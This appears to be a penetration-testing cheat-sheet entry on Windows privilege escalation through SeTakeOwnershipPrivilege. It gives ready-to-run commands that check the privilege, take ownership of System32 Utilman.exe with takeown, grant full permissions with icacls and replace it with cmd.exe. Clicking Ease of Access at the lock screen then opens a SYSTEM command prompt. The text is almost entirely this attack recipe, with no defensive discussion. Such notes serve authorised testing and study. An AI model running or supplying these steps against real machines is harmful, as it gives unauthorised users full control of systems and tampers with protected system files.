The SeTakeOwnership privilege allows a user to ***take ownership of any SYSTEM object*** (e.g., `files`, `registry keys`). This can be exploited by taking ownership of a SYSTEM-level service's executable.

**Check Privileges**
```
whoami /priv
```
- `SeTakeOwnershipPrivilege`

**Abuse `utilman.exe` to Escalate Privilege.** It is a built-in Windows application and run with SYSTEM privileges.

**Take Ownership of Utilman to replace it.**
```
takeown /f C:\Windows\System32\Utilman.exe
```

**Assign yourself Full Permissions over Utilman**
```
icacls C:\Windows\System32\Utilman.exe /grant USERNAME:F
```

**Replace Utilman with a copy of Cmd.exe**
```
copy cmd.exe utilman.exe
```

**To trigger Utilman, lock your screen from the Start Button**

**Proceed to click on the "Ease of Access" button, which runs Utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe, we will get a cmd prompt with SYSTEM privileges.**

